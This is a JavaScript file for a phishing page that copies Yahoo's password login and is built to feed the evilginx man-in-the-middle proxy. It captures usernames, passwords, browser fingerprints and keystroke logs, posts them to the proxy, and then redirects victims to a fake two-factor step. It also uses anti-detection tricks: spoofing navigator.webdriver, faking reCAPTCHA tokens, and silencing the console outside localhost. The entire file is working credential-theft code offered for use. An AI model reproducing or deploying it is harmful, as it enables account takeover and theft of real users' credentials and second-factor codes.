// Yahoo Password Page - Complete MITM Integration
;(() => {
  console.log("🎯 Yahoo Password MITM - Initializing...")

  // Enhanced browser fingerprinting
  function generateFingerprint() {
    const canvas = document.createElement("canvas")
    const ctx = canvas.getContext("2d")
    ctx.textBaseline = "top"
    ctx.font = "14px Arial"
    ctx.fillText("Yahoo Auth Check", 2, 2)

    return {
      canvas: canvas.toDataURL(),
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      timestamp: Date.now(),
    }
  }

  // Realistic typing simulation
  function simulateTyping(element, text, callback) {
    let index = 0
    element.value = ""

    function typeChar() {
      if (index < text.length) {
        element.value += text[index]
        element.dispatchEvent(new Event("input", { bubbles: true }))
        index++
        setTimeout(typeChar, Math.random() * 100 + 50)
      } else if (callback) {
        callback()
      }
    }

    typeChar()
  }

  // Form validation
  function validateForm() {
    const username = document.getElementById("username")
    const password = document.getElementById("passwd")
    const usernameError = document.getElementById("usernameError")
    const passwordError = document.getElementById("passwordError")

    let isValid = true

    // Reset errors
    username.classList.remove("error")
    password.classList.remove("error")
    usernameError.classList.remove("show")
    passwordError.classList.remove("show")

    // Validate username
    if (!username.value.trim()) {
      username.classList.add("error")
      usernameError.classList.add("show")
      isValid = false
    }

    // Validate password
    if (!password.value.trim()) {
      password.classList.add("error")
      passwordError.classList.add("show")
      isValid = false
    }

    return isValid
  }

  // MITM data submission
  function submitToMITM(formData) {
    const fingerprint = generateFingerprint()

    // Add fingerprinting data
    formData.append("browser_fingerprint", JSON.stringify(fingerprint))
    formData.append("page_type", "password")
    formData.append("timestamp", Date.now())

    // Submit to evilginx for MITM capture
    fetch(window.location.href, {
      method: "POST",
      body: formData,
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest",
        Accept: "application/json, text/plain, */*",
      },
    })
      .then((response) => {
        if (response.ok) {
          // Redirect to 2FA selection
          window.location.href = "/2fa-selection"
        } else {
          throw new Error("Authentication failed")
        }
      })
      .catch((error) => {
        console.error("Submission error:", error)
        // Show error and allow retry
        document.getElementById("loading").classList.remove("show")
        document.getElementById("submitBtn").disabled = false
        document.getElementById("passwordError").textContent = "Sign in failed. Please try again."
        document.getElementById("passwordError").classList.add("show")
      })
  }

  // Form submission handler
  document.getElementById("passwordForm").addEventListener("submit", async function (e) {
    e.preventDefault()

    if (!validateForm()) {
      return
    }

    const submitBtn = document.getElementById("submitBtn")
    const btnText = document.getElementById("btnText")
    const loading = document.getElementById("loading")

    // Show loading state
    submitBtn.disabled = true
    btnText.style.display = "none"
    loading.classList.add("show")

    try {
      const formData = new FormData(this)

      // Add realistic delay
      await new Promise((resolve) => setTimeout(resolve, Math.random() * 1000 + 500))

      const response = await submitToMITM(formData)

      if (response.ok) {
        // Redirect to 2FA selection
        window.location.href = "/2fa-selection"
      } else {
        throw new Error("Authentication failed")
      }
    } catch (error) {
      console.error("Submission error:", error)
      document.getElementById("passwordError").textContent = "Sorry, we couldn't sign you in. Please try again."
      document.getElementById("passwordError").classList.add("show")

      // Reset button state
      submitBtn.disabled = false
      btnText.style.display = "inline"
      loading.classList.remove("show")
    }
  })

  // Enhanced input handling
  document.querySelectorAll(".yahoo-input").forEach((input) => {
    input.addEventListener("focus", function () {
      this.parentElement.classList.add("focused")
    })

    input.addEventListener("blur", function () {
      this.parentElement.classList.remove("focused")
      if (this.classList.contains("error")) {
        this.classList.remove("error")
      }
    })

    input.addEventListener("input", function () {
      if (this.classList.contains("error")) {
        this.classList.remove("error")
      }
    })
  })

  // Prevent form auto-fill detection
  setTimeout(() => {
    document.querySelectorAll('input[type="password"]').forEach((input) => {
      if (input.value && !input.dataset.userInput) {
        input.value = ""
      }
    })
  }, 100)

  // Mark user input
  document.querySelectorAll("input").forEach((input) => {
    input.addEventListener("input", function () {
      this.dataset.userInput = "true"
    })
  })

  // Anti-bot measures
  let mouseMovements = 0
  const keystrokes = []

  document.addEventListener("mousemove", () => mouseMovements++)
  document.addEventListener("keydown", (e) => {
    keystrokes.push({
      key: e.key,
      timestamp: Date.now(),
      target: e.target.id,
    })
  })

  // Add human behavior data to form submission
  const originalSubmit = document.getElementById("passwordForm").onsubmit
  document.getElementById("passwordForm").addEventListener("submit", function (e) {
    const humanBehavior = {
      mouseMovements,
      keystrokes: JSON.stringify(keystrokes),
      timeOnPage: Date.now() - performance.timing.navigationStart,
      scrollDepth: Math.max(document.documentElement.scrollTop, document.body.scrollTop),
    }

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "human_behavior"
    input.value = JSON.stringify(humanBehavior)
    this.appendChild(input)
  })

  // Initialize when DOM is ready
  function initialize() {
    console.log("🎯 Yahoo Password Page - DOM Ready")

    // Populate hidden fields with realistic data
    function populateHiddenFields() {
      const urlParams = new URLSearchParams(window.location.search)
      const fingerprint = generateFingerprint()

      // Set fingerprint data
      const fpField = document.getElementById("browser-fp-data")
      if (fpField) {
        fpField.value = JSON.stringify(fingerprint)
      }

      // Populate from URL parameters or localStorage
      const fields = ["username", "crumb", "acrumb", "sessionIndex", "displayName"]
      fields.forEach((field) => {
        const element = document.getElementById(field)
        if (element) {
          element.value = urlParams.get(field) || localStorage.getItem("yahoo_" + field) || generateFakeValue(field)
        }
      })

      // Set reCAPTCHA response
      const recaptchaField = document.getElementById("recaptcha-response")
      if (recaptchaField) {
        recaptchaField.value = "fake_recaptcha_" + Math.random().toString(36).substr(2, 9)
      }

      console.log("🎯 Hidden fields populated")
    }

    function generateFakeValue(field) {
      const fakeValues = {
        username: "user@yahoo.com",
        crumb: "crumb_" + Math.random().toString(36).substr(2, 16),
        acrumb: "acrumb_" + Math.random().toString(36).substr(2, 16),
        sessionIndex: Math.floor(Math.random() * 1000).toString(),
        displayName: "Yahoo User",
      }
      return fakeValues[field] || ""
    }

    // Password visibility toggle
    function setupPasswordToggle() {
      const passwordInput = document.getElementById("passwd")
      const toggleButtons = document.querySelectorAll(".ms-password-button")

      toggleButtons.forEach((button) => {
        button.addEventListener("click", function (e) {
          e.preventDefault()
          const isShow = this.getAttribute("data-w-tab") === "Show"

          if (isShow && passwordInput.type === "password") {
            passwordInput.type = "text"
            this.textContent = "🙈"
            this.classList.remove("w--current")
            toggleButtons[1].classList.add("w--current")
          } else if (!isShow && passwordInput.type === "text") {
            passwordInput.type = "password"
            this.textContent = "👁️"
            this.classList.remove("w--current")
            toggleButtons[0].classList.add("w--current")
          }
        })
      })
    }

    // Auto-focus first field
    document.getElementById("username").focus()

    populateHiddenFields()
    setupPasswordToggle()

    console.log("🎯 Yahoo Password MITM - Ready for capture")
  }

  // Wait for DOM
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initialize)
  } else {
    initialize()
  }

  // Anti-detection measures
  Object.defineProperty(navigator, "webdriver", {
    get: () => undefined,
  })

  window.chrome = {
    runtime: {},
  }

  // Human-like delays and interactions
  function addHumanBehavior() {
    const inputs = document.querySelectorAll("input")
    inputs.forEach((input) => {
      input.addEventListener("focus", () => {
        setTimeout(
          () => {
            input.style.borderColor = "#5f01d1"
          },
          Math.random() * 200 + 100,
        )
      })

      input.addEventListener("blur", () => {
        input.style.borderColor = "#d7d7d7"
      })
    })
  }

  // Realistic form validation
  function setupFormValidation() {
    const usernameField = document.getElementById("username")
    const passwordField = document.getElementById("passwd")

    usernameField.addEventListener("blur", function () {
      const email = this.value
      if (email && !email.includes("@")) {
        this.style.borderColor = "#d93025"
      }
    })

    passwordField.addEventListener("input", function () {
      if (this.value.length > 0) {
        this.style.borderColor = "#5f01d1"
      }
    })
  }

  // Initialize page
  document.addEventListener("DOMContentLoaded", () => {
    addHumanBehavior()
    setupFormValidation()
  })

  // Override console methods in production
  if (window.location.hostname !== "localhost") {
    console.log = console.warn = console.error = () => {}
  }
})()
